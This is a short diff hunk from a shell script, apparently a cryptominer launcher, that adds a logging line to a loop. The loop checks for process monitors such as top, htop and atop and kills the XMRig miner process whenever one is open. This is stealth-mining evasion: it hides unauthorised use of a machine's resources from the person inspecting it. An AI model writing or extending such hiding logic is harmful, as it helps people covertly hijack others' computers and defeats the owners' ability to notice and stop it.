@@ -38,6 +38,7 @@ main() {
 		sleep 1
 
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
+			echo Found top > /tmp/me.log
 			pkill $XMRIGNAME
 			continue
 		fi
